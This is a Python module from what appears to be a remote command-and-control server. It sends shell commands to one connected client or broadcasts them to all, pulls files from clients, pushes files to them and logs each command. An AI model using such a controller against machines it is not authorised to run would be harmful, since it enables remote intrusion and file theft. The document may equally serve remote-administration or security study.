import os
from .sessions import get_client_socket, get_all_clients
from .file_transfers import send_file
from .common import choose_file_to_send


def send_command_to_client(cid, command, base_dir, db_hooks, context="interact"):
    """Send command to specific client."""
    sock = get_client_socket(cid)
    if not sock:
        print(f"[!] Client {cid} not found")
        return

    # PULL command - request file from client
    if command.startswith("pull "):
        filename = command[5:].strip()
        sock.sendall((f"PULL {filename}\n").encode())
        db_hooks["record_command"](cid, command, context)
        print(f"[+] PULL command sent to client {cid}")
        return

    # SEND file to client
    if command == "sendfile":
        filename = choose_file_to_send(base_dir)
        if not filename:
            return
        
        full_path = os.path.join(base_dir, filename)
        try:
            send_file(sock, full_path)
            db_hooks["record_transfer"](cid, "send", filename, os.path.getsize(full_path), context)
            print(f"[+] File sent to client {cid}")
        except Exception as e:
            print(f"[!] Error sending file: {e}")
        return

    # Regular shell command
    sock.sendall((command + "\n").encode())
    db_hooks["record_command"](cid, command, context)
    print(f"[+] Command sent to client {cid}")


def broadcast_command(command, db_hooks=None):
    """Broadcast command to all clients."""
    clients = get_all_clients()
    
    for cid, sock in clients:
        try:
            sock.sendall((command + "\n").encode())
            
            # Log the command to database if db_hooks is provided
            if db_hooks and "record_command" in db_hooks:
                db_hooks["record_command"](cid, command, "broadcast")
                
            print(f"[+] Command sent to client {cid}")
        except Exception as e:
            print(f"[!] Error sending to client {cid}: {e}")